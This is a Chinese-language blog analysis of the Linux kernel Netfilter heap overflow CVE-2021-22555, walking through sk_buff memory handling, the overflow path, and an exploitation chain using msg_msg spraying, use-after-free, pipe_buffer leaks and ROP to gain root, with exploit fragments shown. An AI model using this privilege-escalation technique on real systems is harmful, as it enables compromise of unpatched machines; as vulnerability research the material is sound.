
```c
// v5.9 net/core/skbuff.c
struct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,
                            int flags, int node)
{
    struct kmem_cache *cache;
    struct skb_shared_info *shinfo;
    struct sk_buff *skb;
    u8 *data;
    bool pfmemalloc;

    cache = (flags & SKB_ALLOC_FCLONE)
        ? skbuff_fclone_cache : skbuff_head_cache;

    if (sk_memalloc_socks() && (flags & SKB_ALLOC_RX))
        gfp_mask |= __GFP_MEMALLOC;

    /* Get the HEAD */
    // 从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存
    // 作为头部的管理结构
    skb = kmem_cache_alloc_node(cache, gfp_mask & ~__GFP_DMA, node);
    if (!skb)
        goto out;
    // ......
    // 先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好
    size = SKB_DATA_ALIGN(size);
    // size += 对齐之后的0x140
    // 那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512
    size += SKB_DATA_ALIGN(sizeof(struct skb_shared_info));

    // 虽然是kmalloc_reserve函数，但是最终还是kmalloc形式
    // 调用到__kmalloc_node_track_caller函数进行分配
    // 这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块
    // 并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数
    // 在skb_copy_datagram_from_iter函数中数据会被复制
    data = kmalloc_reserve(size, gfp_mask, node, &pfmemalloc);
    if (!data)
        goto nodata;
    // ...
    size = SKB_WITH_OVERHEAD(ksize(data));
    // ....
    // 初始化头部的管理结构
    memset(skb, 0, offsetof(struct sk_buff, tail));
    /* Account for allocated memory : skb + skb->head */
    skb->truesize = SKB_TRUESIZE(size);
    skb->pfmemalloc = pfmemalloc;
    refcount_set(&skb->users, 1);
    skb->head = data;
    skb->data = data;
    skb_reset_tail_pointer(skb);
    skb->end = skb->tail + size;
    skb->mac_header = (typeof(skb->mac_header))~0U;
    skb->transport_header = (typeof(skb->transport_header))~0U;
    // ...
out:
    return skb;
nodata:
    kmem_cache_free(cache, skb);
    skb = NULL;
    goto out;
}
```

###### 内存申请总结：

- `sk_buff`为数据的管理结构从专门的缓存池`skbuff_fclone_cache/skbuff_head_cache`中申请内存，没办法进行控制
- `skb->data`为实际的数据结构
  - `size`：`0x140+n*0x40`(0x40的倍数补齐)。即如果传入的数据长度为0x3f，则n为1，传入数据为0x41，则n为2。
  - 堆块申请：走`kmalloc`进行申请，比较常见的种类，方便堆喷。
- 每调用`write`函数写入一次数据，都会走一遍流程，申请新的`sk_buff`和`skb->data`，不同消息之间相互独立。

##### B.数据复制

相关内存申请完成之后，回到`unix_stream_sendmsg`函数，开始进行数据复制`skb_copy_datagram_from_iter`，即上述提到的。

```c
// v5.9 net/core/datagram.c
int skb_copy_datagram_from_iter(struct sk_buff *skb, int offset,
                                struct iov_iter *from, int len)
{
    int start = skb_headlen(skb); // skb->len - skb->data_len;
    int i, copy = start - offset; // copy 是线性数据区的剩余空间大小
    struct sk_buff *frag_iter;

    // 拷贝到申请的保存数据的堆块skb->data
    if (copy > 0) {
        if (copy > len)
            copy = len;
        if (copy_from_iter(skb->data + offset, copy, from) != copy)
            goto fault;
        if ((len -= copy) == 0)
            return 0;
        offset += copy;
    }
    //....
}
```

#### ②释放

当从`socket`套接字中读取出某条信息的所有数据时，就会发生该条信息的相关内存的释放，即该条信息对应`sk_buff`和`skb->data`的释放。同样的，如果该条信息没有被读取完毕，则不会发生该信息相关内存的释放。

在`read`时进行的函数调用链：

`read -> ksys_read() -> vfs_read() -> new_sync_read() -> call_read_iter() -> sock_read_iter() -> sock_recvmsg() -> sock_recvmsg_nosec() -> unix_stream_recvmsg() -> unix_stream_read_generic()`

同样的在`unix_stream_read_generic`处开始分叉，也是分为两部分，下面截取重要部分

```c
// v5.9 net/unix/af_unix.c
static int unix_stream_read_generic(struct unix_stream_read_state *state,
                                    bool freezable)
{
    //....
    do {
        //....
        chunk = min_t(unsigned int, unix_skb_len(skb) - skip, size);
        skb_get(skb);
        //--------------------分叉一:数据复制
        // recv_actor函数指针是在unix_stream_recvmsg函数中定义的state函数表
        // 该函数指针对应unix_stream_read_actor函数,即从这开始进行数据复制
        chunk = state->recv_actor(skb, skip, chunk, state);
        //...
        // 传输数据完成之后,skb->users从2改为1,表示已经复制完数据了,方便后续判断
        // 消息中是否还有数据
        consume_skb(skb);
        if (chunk < 0) {
            if (copied == 0)
                copied = -EFAULT;
            break;
        }
        copied += chunk;
        size -= chunk;

        /* Mark read part of skb as used */
        if (!(flags & MSG_PEEK)) {
            // 修改skb类型转换之后对应的consumed字段,其实就是skb->cb某个位置处的数据
            // #define UNIXCB(skb)    (*(struct unix_skb_parms *)&((skb)->cb))
            UNIXCB(skb).consumed += chunk;
            // 依据上面的consumed和len来判断消息中是否还剩下没有传输的数据
            // 有(1)则break,无(0)则进入后续的内存释放阶段
            if (unix_skb_len(skb))
                break;
            //--------------------分叉二:内存释放
            // 内存释放前置工作
            skb_unlink(skb, &sk->sk_receive_queue);
            // 进入该函数,通过对于skb->users的判断之后,进入内存释放阶段
            consume_skb(skb);
            //....................
        }
    } while (size);
    //......................
out:
    return copied ? : err;
}
```

##### A.数据复制

之后的函数调用链为

`unix_stream_read_actor() -> skb_copy_datagram_msg() -> skb_copy_datagram_iter() -> __skb_datagram_iter()`

最终进入`__skb_datagram_iter`，

```c
// v5.9 net/core/datagram.c
static int __skb_datagram_iter(const struct sk_buff *skb, int offset,
                               struct iov_iter *to, int len, bool fault_short,
                               size_t (*cb)(const void *, size_t, void *,
                                            struct iov_iter *), void *data)
{
    int start = skb_headlen(skb);
    int i, copy = start - offset, start_off = offset, n;
    struct sk_buff *frag_iter;

    /* Copy header. */
    // 这个header指的就是数据data,大概就是从这里开始实际的数据
    if (copy > 0) {
        if (copy > len)
            copy = len;
        n = INDIRECT_CALL_1(cb, simple_copy_to_iter,
                            skb->data + offset, copy, data, to);
        offset += n;
        if (n != copy)
            goto short_copy;
        if ((len -= copy) == 0)
            return 0;
    }
    //......
    /* Copy paged appendix. Hmm... why does this look so complicated? */
    // linux内核维护人员都看不下去了,xs
    //......
}
```

这里使用了感觉很复杂的机制，不是很懂。

##### B.内存释放

进入内存释放的函数调用链为

- 释放`skb->data`部分：

  `consume_skb() -> __kfree_skb() -> skb_release_all() -> skb_release_data() -> skb_free_head()`

  对应函数如下：

```c
// v5.9 net/core/skbuff.c
static void skb_free_head(struct sk_buff *skb)
{
    // 其实head和data是一样的
    unsigned char *head = skb->head;
    if (skb->head_frag) {
        if (skb_pp_recycle(skb, head))
            return;
        skb_free_frag(head);
    } else {
        kfree(head);
    }
}
```

  可以看到使用的正常的`kfree`函数

- 释放`skb`部分：

  `consume_skb() -> __kfree_skb() -> kfree_skbmem()`

  相关函数如下

```c
// v5.9 net/core/skbuff.c
static void kfree_skbmem(struct sk_buff *skb)
{
    struct sk_buff_fclones *fclones;

    // 克隆体相关的,没有fork之类的话一般不用太管的
    switch (skb->fclone) {
    case SKB_FCLONE_UNAVAILABLE:
        // 用专门的cache(skbuff_head_cache)进行回收
        kmem_cache_free(skbuff_head_cache, skb);
        return;

    case SKB_FCLONE_ORIG:
        fclones = container_of(skb, struct sk_buff_fclones, skb1);

        /* We usually free the clone (TX completion) before original skb
         * This test would have no chance to be true for the clone,
         * while here, branch prediction will be good.
         */
        if (refcount_read(&fclones->fclone_ref) == 1)
            goto fastpath;
        break;

    default: /* SKB_FCLONE_CLONE */
        fclones = container_of(skb, struct sk_buff_fclones, skb2);
        break;
    }
    if (!refcount_dec_and_test(&fclones->fclone_ref))
        return;
fastpath:
    // 用专门的cache(skbuff_fclone_cache)进行回收克隆的skb
    kmem_cache_free(skbuff_fclone_cache, fclones);
}
```

  这个就不太好利用了。

  同样的，当关闭的信道的两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放

##### 内存释放总结：

- 当从信道中将某条消息全部读取完之后，会发生该条消息对应的`sk_buff`和`skb->data`的内存释放，且`sk_buff`释放到专门的缓存池中，`skb->data`使用正常的`kfree`释放
- 当关闭信道两端，该信道内产生的所有的`sk_buff`和`skb->data`都会得到释放，具体的调用链为：

  `sock_close() -> __sock_release() -> unix_release() -> __kfree_skb()`

  后面就类似了。

# 一、漏洞分析

## 前言

由于我编译环境的时候老是出问题（后面才解决的），所以直接拿`bsauce`师傅提供的环境来用了，但是又没有带DEBUG的`vmlinux`，所以我使用[vmlinux-to-elf](https://bbs.kanxue.com/elink@3faK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6E0j5i4u0A6L8W2)9J5k6r3#2Q4x3V1k6$3L8h3I4A6L8Y4g2^5i4K6u0V1N6r3!0Q4x3X3c8W2L8r3k6Q4x3X3g2Y4K9i4b7`.)简单获取下符号就开始逆向了(xs)，所以下面漏洞分析提到的地址为`bsauce`师傅环境的地址。

[CVE-2021-22555 2字节堆溢出写0漏洞提权分析 - 安全客，安全资讯平台 (anquanke.com)](https://bbs.kanxue.com/elink@45bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2S2L8Y4q4#2j5h3&6C8k6g2)9J5k6h3y4G2L8g2)9J5c8Y4m8G2M7%4c8Q4x3V1k6A6k6q4)9J5c8U0t1#2y4o6l9J5y4#2)9J5x3$3R3J5i4K6u0V1x3b7`.`.)

相关的`Netfilter`分析就不做了，也不太会，可以看看`bsauce`师傅的，这里主要关注数据的传输过程的一些东西。

通过`Netfilter`的`setsockopt`系统调用，传入用户数据`&data`，可依据该`&data`中的相关数据进行不同大小的堆块申请。完成申请后，还会对该堆块进行一定的处理，其中就有向堆块末尾填充数据的操作。

`memset(t->data + target->targetsize, 0, pad);`

其中`t->data+target->targetsize`即为申请的堆块上末尾处的某个地址，`pad`为如下定义

`pad = XT_ALIGN(target->targetsize) - target->targetsize;`

其实`pad`的值即为`8 - (target->targetsize mod 8)`，就是所谓的8字节对齐。

并且`t->data`的地址偏移和`target->targetsize`的值都可被我们直接或间接地控制，那么就可以存在堆块溢出写0的操作了，这里最多溢出4个字节填充为0。

下面是具体的关键函数调用链和相关分析

## 1. `nf_setsockopt()`

句柄定义

```c
// v5.11.14 net/ipv4/netfilter/ip_tables.c
static struct nf_sockopt_ops ipt_sockopts = {
    ....
    .get = do_ipt_get_ctl,
    ....
};
```

这样到调用`setsockopt`系统调用时，就会调用到`do_ipt_get_ctl`函数。

## 2. `do_ipt_set_ctl()`

- 参数：

  `(struct sock *sk, int cmd, sockptr_t arg, unsigned int len)`

  调试如下![image-20220501113945278](https://bbs.kanxue.com/upload/attach/202205/904686_C6TKYUX7RD9T76D.jpg)

  这个`&data`即为用户传入的，赋值给`sockptr_t arg`，从而依据`sockptr_t arg`来进行堆块申请和相关的漏洞填充操作。

- 地址：`0xffffffff81b0bd20`

- 介绍：该函数由`nf_sockopt_ops ipt_sockopts`进行句柄定义

  ```c
  static struct nf_sockopt_ops ipt_sockopts = {
      ....
      .get = do_ipt_get_ctl,
      ....
  };
  ```

  即系统调用`setsockopt`实际调用到与漏洞方面有关的最早的函数，传入的`sockptr_t arg`即为用户参数`&data`，后续会调用到`compat_do_replace`，传入`sockptr_t arg`

## 3. `compat_do_replace()`

通过`_copy_from_user`复制`&data`的`0x5c`字节给`tmp`

- 参数：

  `(struct net *net, sockptr_t arg, unsigned int len)`

- 地址：`0xffffffff81b0baf0`

- 介绍：

  - 主要关注变量：

    ```c
    // 传入的
    sockptr_t arg;

    // 自定义的
    struct compat_ipt_replace tmp;
    // 保存size
    struct xt_table_info *newinfo;
    ```

  调用`translate_compat_table()`，传入本函数定义的`tmp`作为`compatr`，该变量`tmp`由函数`copy_from_sockptr(&tmp, arg, sizeof(tmp))`进行赋值

  - 相关函数链：`copy_from_sockptr -> copy_from_sockptr_offset -> copy_from_user`

    ```c
    // v5.11.14 include/linux/sockptr.h

    static inline int copy_from_sockptr_offset(void *dst, sockptr_t src,
                                              size_t offset, size_t size)
    {
        if (!sockptr_is_kernel(src))
            return copy_from_user(dst, src.user + offset, size);
        memcpy(dst, src.kernel + offset, size);
        return 0;
    }
    ```

  这里的`dst`即为`tmp`，`src`即为`arg`，也就是会依据`arg(&data)`的内容来给`tmp`赋值。即最后的`compatr`的来源为上述提到的`sockptr_t arg`，也就是用户传入的参数`&data`。

  从`&data`中复制`0x5c(sizeof(struct compat_ipt_replace))`大小的给到`tmp(compatr)`，如下代码所示

  ```c
  // v5.11.14 net/ipv4/netfilter/ip_tables.c
  static int
  compat_do_replace(struct net *net, sockptr_t arg, unsigned int len)
  {
      //.....
      if (copy_from_sockptr(&tmp, arg, sizeof(tmp)) != 0)
          return -EFAULT;
      ////
      //....
      // 这里的tmp.size即为0xfb6，传入的data.replace.size，也是申请了堆块的。
      // 不过这个堆块不用太过关注，但是这个不能随便设置，不然会在如下检查出错误
      // 然后跳转out_unlock从而无法进入漏洞点
      /*
      // translate_compat_table函数中
      // Walk through entries, checking offsets.
      xt_entry_foreach(iter0, entry0, compatr->size) {
          ret = check_compat_entry_size_and_hooks(iter0, info, &size,
                                                  entry0, entry0 + compatr->size);
          if (ret != 0)
              goto out_unlock;
          ++j;
      }

      */
      // 需要注意的是这个newinfo和下面函数中的newinfo不是同一个
      newinfo = xt_alloc_table_info(tmp.size);
      //......
      ret = translate_compat_table(net, &newinfo, &loc_cpu_entry, &tmp);
      //.....
  }
  ```

  复制的这些数据中就包含定义好的size，用来完成之后的堆块申请。

## 4. `translate_compat_table()`

- 参数：

  `(struct net *net, struct xt_table_info **pinfo, void **pentry0, const struct compat_ipt_replace *compatr)`

- 地址：`0xffffffff81b0b3e0`

- 介绍：

  - 主要关注变量：

    ```c
    // 传入的
    const struct compat_ipt_replace *compatr;

    // 自定义的
    unsigned int size;
    struct xt_table_info *newinfo;
    void *pos, *entry1;
    struct compat_ipt_entry *iter0;
    ```

  - `size`：`size = compatr->size;`
  - `newinfo`：依据`size`即上述的`compatr->size`申请堆块，漏洞点就出在这个申请的堆块上面。

    ```c
    translate_compat_table(struct net *net,
                           struct xt_table_info **pinfo,
                           void **pentry0,
                           const struct compat_ipt_replace *compatr)
    {
        //.....
        size = compatr->size;
        //....
        // 这个堆块就是漏洞堆块了。
        newinfo = xt_alloc_table_info(size);
        //.....
    }
    ```

    通过`xt_alloc_table_info`来申请堆块，其中有如下代码

    ```c
    // v5.11.14 net/netfilter/x_tables.c
    struct xt_table_info *xt_alloc_table_info(unsigned int size)
    {
        struct xt_table_info *info = NULL;
        size_t sz = sizeof(*info) + size; // 加上0x40大小

        if (sz < sizeof(*info) || sz >= XT_MAX_TABLE_SIZE)
            return NULL;
        // 实际申请的堆块大小为0xffe,即kmalloc-4096，这个堆块就是漏洞堆块了。
        // 结构为struct xt_table_info
        info = kvmalloc(sz, GFP_KERNEL_ACCOUNT);
        if (!info)
            return NULL;

        memset(info, 0, sizeof(*info));
        info->size = size;
        return info;
    }
    ```

    可以看到使用`kvmalloc`，申请标志为`GFP_KERNEL_ACCOUNT`，并且`XT_MAX_TABLE_SIZE`定义如下，也就是在kmalloc-512到kmalloc-8192

    ```c
    #define XT_MAX_TABLE_SIZE    (512 * 1024 * 1024)
    ```

  - `pos/entry1`：

    ```c
    entry1 = newinfo->entries;
    pos = entry1;
    ```

    即`pos/entry1`的值为`newinfo_addr+0x40`(0x4*3+0x14+0x14+0x4+0x8)

  - 调用如下函数进行下一步：

    ```c
    compat_copy_entry_from_user(iter0, &pos, &size, newinfo, entry1);
    ```

## 5. `compat_copy_entry_from_user()`

- 参数：

  ```c
  (struct compat_ipt_entry *e, void **dstptr,
   unsigned int *size,
   struct xt_table_info *newinfo, unsigned char *base)
  ```

- 地址：不太清楚

- 介绍：

  - 主要关注变量：

    ```c
    // 传入的
    // 即保存pos的栈地址，值为newinfo->entries(newinfo_addr+0x40)
    void **dstptr;
    unsigned int *size;
    struct xt_table_info *newinfo;
    ```

  - 相关操作：

    ```c
    compat_copy_entry_from_user(struct compat_ipt_entry *e, void **dstptr,
                                unsigned int *size,
                                struct xt_table_info *newinfo, unsigned char *base)
    {
        //....
        // 即pos加上0x70，值为newinfo_addr+0x40+0x70
        *dstptr += sizeof(struct ipt_entry);
        *size += sizeof(struct ipt_entry) - sizeof(struct compat_ipt_entry);
        xt_ematch_foreach(ematch, e)
            xt_compat_match_from_user(ematch, dstptr, size);
        //.....
        xt_compat_target_from_user(t, dstptr, size);
        //.....
    }
    ```

## 6. `xt_compat_match_from_user()`

这个函数和接下来的漏洞函数`xt_compat_target_from_user`可以说基本一致，观察下图即可看到，具体用来干什么不太清楚，但是作用也是相关的`pad`填充`newinfo`上的数据。打了一个循环`xt_ematch_foreach`，在我们关注的这个漏洞里，其作用就只是使得`*dstptr + n * msize`，也就是在我们关心的最终值为`newinfo_addr+0x40+0x70+n * msize`，从而使得在进入`xt_compat_target_from_user`之前，`*dstptr`上的堆块地址已经移动到末尾了。

<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214923917.png" alt="image-20220507214923917" style="zoom: 80%;" /> <img src="https://pig-007.oss-cn-beijing.aliyuncs.com/Img/image-20220507214947982.png" alt="image-20220507214947982" style="zoom: 80%;" />

做了一个数据对比：

```
newinfo： 0xffff888006a2a000
t：      0xffff888006a2afda
t->data：0xffff888006a2affa
target->targetsize：0x4
dstptr：
  xt_compat_match_from_user的时候：0xffffc900002b7ad0->0xffff888006a2a0b0
  xt_compat_target_from_user的时候：0xffffc900002b7ad0->0xffff888006a2afda
```

也就是说经过`xt_compat_match_from_user`函数之后，保存在`*dstptr`上的漏洞堆的地址已经加上了`0xf2a`。

## 6. `xt_compat_target_from_user()`

终于来到最后的漏洞函数

- 参数：

  ```c
  (struct xt_entry_target *t, void **dstptr,
   unsigned int *size)
  ```

- 地址：`0xFFFFFFFF81A82F75`

- 介绍：

  - 主要关注变量

    ```c
    // 传入的
    struct xt_entry_target *t;
    void **dstptr;
    unsigned int *size;

    // 自定义的
    const struct xt_target *target = t->u.kernel.target;
    int pad, off = xt_compat_target_offset(target);
    ```

  - 相关操作：

    ```c
    void xt_compat_target_from_user(struct xt_entry_target *t, void **dstptr,
                                    unsigned int *size)
    {
        const struct xt_target *target = t->u.kernel.target;
        int pad, off = xt_compat_target_offset(target);
        //.....
        // 即获取指针为newinfo+0x40+0x70+0xf2a
        t = *dstptr;
        //.....
        // 进行8字节对齐
        pad = XT_ALIGN(target->targetsize) - target->targetsize;
        if (pad > 0)
            // target->targetsize为4，则最终传入的地址为
            // newinfo+0x40+0x70+0xf2a+0x20+0x4=newinfo+0xffe
            // 同时pad在经过对齐之后也为4,那么就溢出2个字节
            memset(t->data + target->targetsize, 0, pad);
        //.....

    }
    ```

## 总结

通过上述分析可以看到，其实该漏洞的成因就是

### (1)控制堆块大小和偏移

通过控制传入的`&data`中的`pad`的大小来控制申请的堆块的大小和`t->data`的相对偏移地址

```c
struct __attribute__((__packed__)) {
    struct ipt_replace replace; // 0x60
    struct ipt_entry entry;     // 0x70
    struct xt_entry_match match; // 0x20
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target; // 0x20
} data = {0};
```

例子：

比如`bsauce`师傅提供的EXP中的`pad`如下，这里使用的是`kmalloc-4096`：

```c
char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
```

那么我们尝试使用`kmalloc-2048`，在代码中减去`0x800`得到如下：

```c
char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 - 0x800];
```

断点打在`xt_alloc_table_info`，在第二次的`xt_alloc_table_info`申请漏洞堆块处，查看下CPU0的`kmalloc-2048`中`freelist`中的堆块。

![image-20220508200120767](https://bbs.kanxue.com/upload/attach/202205/904686_A57D6S4FN4EJBGY.jpg)

然后`finish`当前函数，查看`rax`申请到的堆块，即为`freelist`中的第一个堆块

![image-20220508200155851](https://bbs.kanxue.com/upload/attach/202205/904686_CWXCJ5CCGP9Z8RW.jpg)

可以看到是从CPU0的`kmalloc-2048`中申请得到的，之后在`call memset`的漏洞点打下断点，按`c`继续运行，断下来

![image-20220508200407354](https://bbs.kanxue.com/upload/attach/202205/904686_MAP5DWZ65EXGZUR.jpg)

可以看到仍然还是该漏洞堆块，并且相关的地址也类似的，`pad`为0x4，所以还是存在漏洞点的。

不过具体的细节有点不太清楚，后续还得补一补`Netfilter`的相关知识。

### (2)控制填充pad

通过控制传入的`data.target.u.user.revision`来控制`target->targetsize`

```c
data.target.u.user.revision = 1;
```

不同的`version`控制不同的`target->targetsize`。

这里经过我自己的实际调试，感觉`bsauce`师傅说的有点小问题。漏洞点应该是出在上述的`t->data`地址没有0x8对齐的时候，并且`target->size`也没有0x8对齐的情况下。

此外，不应该只是2字节溢出，最多应该可以到达4字节溢出，如下设置

```c
char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2 + 0x2];
```

这样可以溢出4个字节写0，最终效果如下：

![image-20220508204003227](https://bbs.kanxue.com/upload/attach/202205/904686_FTM4B3USA9HFY3R.jpg)

如果再加`pad`的话就会导致申请出`kmalloc-8192`的堆块了

# 二、漏洞利用

## 1.溢出转化UAF

这里涉及到之前提到的`msg_msg`结构体利用。

### (1)堆喷内存布局

首先使用`msgget`申请多个消息队列，然后往每个消息队列发送两条消息，一条主消息`0x1000`，一条辅助消息`0x400`。这里发送消息时需要注意下，先遍历每个队列发送主消息，然后再遍历每个队列发送辅助消息。这样进行堆喷构造后，其中就会有部分的消息队列中的主消息连成一整块地址连续的内存，**辅助消息也需要地址连成一整块，方便后续泄露地址，但是这里为了好看就没有连一起**。比如这里申请三个消息队列，最终形成类似的如下布局

![image-20220513110107919](https://bbs.kanxue.com/upload/attach/202205/904686_AU79CF8PF6Q5FRS.jpg)

当然这里每条`0x1000`的主消息中还有几个`struct msg_msgseg*`没有画出来

### (2)漏洞溢出构造UAF

这里我们先释放例子中的第二条主消息，虽说在主消息中是由4个`kmalloc(0x400)`申请出来的4个堆块，但是如果都释放之后，内存的回收机制发现这四个地址连续且都被释放，那么就会归并成一页`page`还给`Slub`分配器，其实就是`kmalloc-4096`。（里面算法很复杂，不是很懂，后面再来理清楚。）之后再申请`0x1000`大小的堆块，就会优先从这里取。

![image-20220513110346186](https://bbs.kanxue.com/upload/attach/202205/904686_SW3WTMVP56DEE7E.jpg)

然后我们使用漏洞，调用`socketopt`来申请一个`0x1000`的`xt_table_info`，就会占据到我们刚刚释放的`0x1000`大小的堆块上。(这个前面我们分析`socketopt`会申请两个`0x1000`大小的堆块，那么我们之后就是多释放几条主消息即可)这样在占据之后，发生2字节溢出写0，就可以溢出到下一个消息队列的`msg_msg`头部结构的`struct list_head m_list.next`指针，从而使得其指向其他位置，如果运气好的话，由于辅助消息也是堆喷形式，且大小为`0x400`，那么溢出两字节写0就可能将该`next`指针指向其他的辅助消息，从而造成两个消息队列中共存一个辅助消息。

![image-20220513110927931](https://bbs.kanxue.com/upload/attach/202205/904686_GD6HBTCVT62XJZ4.jpg)

比如图中消息队列3中的主消息头部的`struct list_head m_list.next`即被修改(黑色为溢出2字节写0)，如红色箭头所示指向了消息队列1中的辅助消息，这样消息队列1和消息队列3都指向了同一个辅助消息，构成了堆块`overlap`。之后我们释放消息队列1中的辅助消息，而消息队列3仍然指向该辅助消息，构成了UAF。

![](https://bbs.kanxue.com/upload/attach/202205/904686_SQAMBJ4RWXPXTV7.jpg)

注：在实际的利用里，需要进行堆喷布局，申请很多的消息队列，这时候就需要用`MSG_COPY`标志位来进行消息读取。利用此标志位读取消息但不释放堆块，然后借助发送消息时自己留下的索引标志来判断到底是哪个辅助消息被两个消息队列所包含，这样就能进行后续的利用。

## 2.利用UAF

### (1)泄露堆地址

首先使用`sk_buff`的`data`数据块来占据该`UAF`堆块。前面提到`sk_buff`的结构头使用独有的缓冲池`kache`来申请，但是其`data`数据块还是使用`kmalloc`常规路线来申请释放(使用正常的发包收包即可完成申请释放)，并且`size`和`data`内容完全可控，这样我们就可以完全控制该`UAF`堆块。

之后伪造一个`fake_msg_msg`结构体，结构如下

![image-20220513112451162](https://bbs.kanxue.com/upload/attach/202205/904686_6TNQUDX2SZD3GVB.jpg)

```c
// v5.11 include/linux/msg.h
struct msg_msg {
    struct list_head m_list; // 与msg_queue或者其他的msg_msg组成双向循环链表
    long m_type;
    size_t m_ts; /* message text size */
    struct msg_msgseg *next; // 单向链表，指向该条信息后面的msg_msgseg
    void *security; /* the actual message follows immediately */
};
```

改大其`m_ts`域，就可以读取出消息队列2的辅助消息头部指针`struct list_head m_list.next`的值，从而泄露消息队列2的`msg_msg_queue`的`struct list_head m_list`域的地址，为一个堆地址。

之后我们修改`fake_msg_msg`的`struct msg_msgseg *next`指针，指向上述获得的消息队列2的`struct list_head m_list`域的地址，就能读出该`struct list_head m_list`域的`prev`指针，即为消息队列2的辅助消息的地址，减去`0x400`即为`UAF`堆块的地址

### (2)泄露内核基地址

接下来利用到`pipe`管道，主要是其中`struct pipe_inode_info`的`struct pipe_buffer *bufs;`数组，总大小为`0x280`，使用`kmalloc-1024`，满足当前的`UAF`（同样使用正常的`read/write`即可完成申请释放）。其结构为

```c
// v5.11.14 include/linux/pipe_fs_i.h
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```

利用如下操作读取`const struct pipe_buf_operations *ops;`指针，即可泄露内核基地址

- 利用 `sk_buff` 修复`UAF`处的辅助消息，之后从消息队列中接收该辅助消息，此时该`UAF`对象重回 `slub`的`kmalloc-1024`的`freelist`中，但 `sk_buff` 仍指向该`UAF`对象
- 喷射 `pipe_buffer`，就会将该`UAF`对象申请回来，将`pipe_buffer`写入到该`UAF`对象上，之后再接收 `sk_buff` 数据包，即可获取`pipe_buffer`上的数据，得到`const struct pipe_buf_operations *ops;`指针，即可泄露内核基地址

![image-20220513115154194](https://bbs.kanxue.com/upload/attach/202205/904686_VRPQ3JF92Y9GZR3.jpg)

### (3)劫持程序执行流

之前也提到过，当我们关闭管道`pipe`两端或者从管道`pipe`中读取出所有数据之后，会调用到`pipe_buf_release()`函数进行清理，其中会调用`struct pipe_buffer *bufs;`下的`const struct pipe_buf_operations *ops;`对应函数表中的`release`函数指针。

```c
static inline void pipe_buf_release(struct pipe_inode_info *pipe,
                                    struct pipe_buffer *buf)
{
    const struct pipe_buf_operations *ops = buf->ops;

    buf->ops = NULL;
    ops->release(pipe, buf);
}
```

现在我们就可以通过`sk_buff`来劫持`ops`指针函数表，修改其中的`release`函数指针，完成劫持程序流。并且此时的`rsi`即为`buf`为我们的`UAF`对象，而`sk_buff`又可以使得`UAF`对象里的数据完全可控。如果找到一个可以将`rsp`劫持为`rsi`的`gadget`，那么就可以完全操控程序流程了。

## 3.EXP解析

这个其实也没有什么好讲的，看懂漏洞利用过程其实也很容易写出来的，主要提一下某些比较偏的知识点，也防止忘记。

### (1)绑定CPU分配

通常是用来进行堆块分配时查看堆块内存的，防止堆块申请的时候东一个西一个的，方便调试，同时也是为了提高堆喷射的稳定性

```c
// bind the cpu0
cpu_set_t set;
CPU_ZERO(&set);
CPU_SET(0, &set);
if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    perror("[-] sched_setaffinity");
    return -1;
}
```

### (2)命名空间

```c
int setup_sandbox(void) {
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }
}
```

`EXP`原作者称：当`IPT_SO_SET_REPLACE`或`IP6T_SO_SET_REPLACE`在兼容模式下被调用时（需要`CAP_NET_ADMIN`权限）。

这个在源代码`do_ipt_set_ctl()`函数中有所体现

```c
// v5.11.14 net/ipv4/netfilter/ip_tables.c
static int
do_ipt_set_ctl(struct sock *sk, int cmd, sockptr_t arg, unsigned int len)
{
    int ret;
    // 提到当兼容模式下需要CAP_NET_ADMIN权限
    if (!ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN))
        return -EPERM;
    //....
    return ret;
}
```

而用户空间隔离出独立的命名空间后就能拥有`CAP_NET_ADMIN`权限，所以需要，其实也不是太懂这个干啥的。

其他的好像也没有什么了，就是最后的`ROP`链条方面的东西，由于最后触发劫持程序流的时候，`rsi`为`UAF`对象地址，所以利用`gadget`先进行栈劫持`rsp`，然后使用利用`commit_creds(&init_cred)`获取ROOT权限，之后使用`SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE`绕过`KPTI`和`SMEP`即可。

参考：[【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析 - arttnba3's blog](https://bbs.kanxue.com/elink@442K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2M7Y4c8@1L8X3u0S2x3#2)9J5k6h3y4F1i4K6u0r3x3U0l9J5x3W2)9J5c8U0l9@1i4K6u0r3x3o6q4Q4x3V1k6o6g2V1g2Q4x3X3b7H3h3o6l9%4i4K6u0V1b7#2k6q4i4K6u0V1x3U0l9J5x3g2)9J5k6o6t1J5y4e0f1#2i4K6u0r3i4K6t1K6c8X3W2F1j5h3I4Q4x3X3c8q4h3q4m8x3e0@1W2f1)

